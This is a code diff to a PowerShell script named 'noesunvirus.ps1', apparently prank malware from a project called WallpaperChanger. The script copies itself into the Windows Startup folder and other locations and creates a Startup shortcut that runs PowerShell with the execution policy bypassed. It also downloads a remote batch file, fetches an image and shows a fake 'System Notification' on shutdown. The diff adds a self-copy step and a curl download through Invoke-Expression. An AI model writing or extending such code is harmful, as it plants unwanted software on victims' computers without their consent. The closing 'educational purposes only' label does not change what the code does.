@@ -1,7 +1,7 @@
 $scriptPath1 = "$env:userprofile\AppData\Local\Temp\noesunvirus.ps1"
 $scriptPath2 = "$env:userprofile\Documents\noesunvirus.ps1"
 $scriptPath3 = "$env:appdata\Microsoft\Windows\Start Menu\Programs\Startup\noesunvirus.ps1"
-$batFilePath = "$env:userprofile\start.bat"
+$batFilePath = "$env:userprofile\Downloads\start.bat"
 $batchUrl = "https://raw.githubusercontent.com/notthecoolguyyouknow/WallpaperChanger/main/start.bat"
 
 $startDelayEnabled = $true
@@ -30,11 +30,24 @@ $imageUrl = "https://i.kym-cdn.com/editorials/icons/mobile/000/009/963/evil_jonk
 
 if (-not (Test-Path $imagePath)) {
     Write-Host "Downloading image..."
-    Invoke-WebRequest -Uri $imageUrl -OutFile $imagePath
-    if (Test-Path $imagePath) {
-        Write-Host "Image downloaded successfully."
-    } else {
-        Write-Host "Failed to download image."
+    
+    try {
+        Write-Host "Trying to download with curl..."
+        Invoke-Expression "curl -o `"$imagePath`" `"$imageUrl`""
+        if (Test-Path $imagePath) {
+            Write-Host "Image downloaded successfully with curl."
+        } else {
+            Write-Host "Curl failed. Trying Invoke-WebRequest..."
+            Invoke-WebRequest -Uri $imageUrl -OutFile $imagePath
+            if (Test-Path $imagePath) {
+                Write-Host "Image downloaded successfully with Invoke-WebRequest."
+            } else {
+                Write-Host "Failed to download image with both curl and Invoke-WebRequest."
+                exit
+            }
+        }
+    } catch {
+        Write-Host "Error during download: $_"
         exit
     }
 } else {
@@ -56,10 +69,13 @@ function Show-ImageMessage {
     [System.Windows.MessageBox]::Show("Why so serious?", "System Notification", [System.Windows.MessageBoxButton]::OK, [System.Windows.MessageBoxImage]::Information)
 }
 
-Register-WmiEvent -Query "SELECT * FROM Win32_ComputerShutdownEvent" -Action {
-    Show-ImageMessage
+try {
+    Register-WmiEvent -Query "SELECT * FROM Win32_ComputerShutdownEvent" -Action {
+        Show-ImageMessage
+    }
+} catch {
+    Write-Host "WMI not available in this environment."
 }
-
 
 $startupShortcutPath = "$env:appdata\Microsoft\Windows\Start Menu\Programs\Startup\SetWallpaper.lnk"
 
@@ -69,6 +85,10 @@ if (-not (Test-Path $startupShortcutPath)) {
     $shortcut.TargetPath = "powershell.exe"
     $shortcut.Arguments = "-ExecutionPolicy Bypass -File `"$scriptPath`""
     $shortcut.Save()
+
+    if ($MyInvocation.MyCommand.Path -ne $scriptPath1) {
+        Copy-Item $MyInvocation.MyCommand.Path $scriptPath1
+    }
 }
 
 # Educational purposes only!
